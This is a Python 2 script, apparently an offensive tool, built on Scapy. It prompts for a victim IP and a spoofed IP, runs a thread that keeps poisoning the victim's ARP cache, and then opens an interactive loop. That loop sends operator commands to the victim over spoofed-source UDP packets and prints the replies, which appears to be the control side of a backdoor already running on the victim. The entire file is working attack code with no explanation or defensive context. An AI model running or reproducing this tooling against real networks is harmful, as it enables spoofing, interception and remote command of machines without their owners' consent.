#! /usr/bin/python
 
import sys
import socket
import threading
import time
from logging import getLogger, ERROR
 
getLogger('scapy.runtime').setLevel(ERROR)
 
try:
    from scapy.all import *
except ImportError:
    print '[!] Scapy Installation Not Found'
    sys.exit(1)
 
try:
    victimIP = raw_input('[*] Enter Victim IP: ')
    spoofIP = raw_input('[*] Enter IP to Spoof: ')
    IF = raw_input('[*] Enter Desired Interface: ')
except KeyboardInterrupt:
    print '[!] User Interrupted Input'
    sys.exit(1)
 
conf.verb = 0
 
def getMAC():
    try:
        pkt = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = victimIP), timeout = 2, iface = IF, inter = 0.1)
    except Exception:
        print '[!] Failed to Resolve Victim MAC Address'
        sys.exit(1)
    for snd, rcv in pkt[0]:
        return rcv.sprintf(r"%Ether.src%")
print '\n[*] Resolving Victim MAC Address... '
victimMAC = getMAC()
 
 
spoofStatus = True
def poison():
    while 1:
        if spoofStatus == False:
            break
            return
        send(ARP(op=2, pdst=victimIP, psrc=spoofIP, hwdst=victimMAC))
        time.sleep(5)
 
print '\n[*] Starting Spoofer Thread...'
thread = []
try:
    poisonerThread = threading.Thread(target=poison)
    thread.append(poisonerThread)
    poisonerThread.start()
    print '[*] Thread Started Successfully\n'
except Exception:
    print '[!] Failed to Start Thread'
    sys.exit(1)
 
print '[*] Initializing Interaction With Victim...'
pkt1 = sr1(IP(dst=victimIP, src=spoofIP)/UDP(sport=80, dport=80)/Raw(load='hello victim'))
pkt2 = sr1(IP(dst=victimIP, src=spoofIP)/UDP(sport=80, dport=80)/Raw(load='report'))
 
prompt = pkt2.getlayer(Raw).load
 
print '[*] Initialization Complete'
print '[*] Enter "goodbye" to Stop Interaction\n'
 
while 1:
    command = raw_input(prompt)
    sendcom = sr1(IP(dst=victimIP, src=spoofIP)/UDP(sport=80, dport=80)/Raw(load=command))
    output = sendcom.getlayer(Raw).load
    if command.strip() == 'goodbye':
        print '\nGrabbing Threads...'
        spoofStatus = False
        poisonerThread.join()
        sys.exit(1)
    print output